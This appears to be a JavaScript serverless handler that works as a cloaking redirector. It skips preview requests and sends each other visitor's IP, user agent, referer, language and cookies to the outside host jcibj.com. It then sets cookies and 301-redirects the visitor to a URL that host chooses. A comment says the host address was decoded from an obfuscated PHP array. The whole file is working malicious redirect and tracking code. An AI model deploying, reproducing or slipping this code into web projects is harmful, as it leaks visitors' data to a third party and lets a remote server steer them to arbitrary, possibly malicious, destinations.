export default async function handler(req, res) {
  const isPreview = req.headers['x-purpose'] === 'preview';
  if (isPreview) return res.status(204).end(); // Do nothing for preview requests

  const date = new Date().toISOString().replace('T', ' ').split('.')[0];
  const id = '499178';
  const uid = 'yrez8stiipeall2mn4qv94nec';
  const query = req.url.split('?')[1] || '';
  const u = 'https://jcibj.com/pcl.php'; // Decoded from PHP chr() array

  const data = {
    date,
    lan: req.headers['accept-language'] || '',
    ref: req.headers['referer'] || '',
    ip: req.headers['x-real-ip'] || req.headers['x-forwarded-for'] || req.socket.remoteAddress,
    ipr: req.headers['x-forwarded-for'] || '',
    sn: req.headers['host'] || '',
    requestUri: req.url,
    query,
    ua: req.headers['user-agent'] || '',
    co: req.cookies?._event || '',
    user_id: uid,
    id: id,
  };

  try {
    const response = await fetch(u, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams(data).toString(),
    });

    const result = await response.text();
    const arr = result.split(',');

    const [status, targetUrl, include, days, type, hasFallback, eventVal, cookieName, cookieVal, cookieDays] = arr;

    const querySuffix = query ? (targetUrl.includes('?') ? '&' : '?') + query : '';

    if (cookieName && cookieVal && cookieDays) {
      res.setHeader('Set-Cookie', `${cookieName}=${cookieVal}; Path=/; Max-Age=${60 * 60 * 24 * parseInt(cookieDays)}; HttpOnly`);
    }

    if (include === '1' || include === 'true') {
      if (type === '1' || type === '3') {
        res.setHeader('Set-Cookie', `_event=${eventVal}; Path=/; Max-Age=${60 * 60 * 24 * parseInt(days)}; HttpOnly`);
      }
    }

    if (status === 'true' || status === 'false') {
      const finalUrl = status === 'false' && !hasFallback ? targetUrl : targetUrl + querySuffix;

      // Set _event cookie if needed
      if (include === '1' || include === 'true') {
        if (type === '2' || type === '3') {
          res.setHeader('Set-Cookie', `_event=${eventVal}b; Path=/; Max-Age=${60 * 60 * 24 * parseInt(days)}; HttpOnly`);
        }
      }

      return res.writeHead(301, { Location: finalUrl }).end();
    }

    return res.status(400).send('Unhandled redirect format');
  } catch (err) {
    console.error('Error:', err);
    return res.status(500).send('Server error');
  }
}
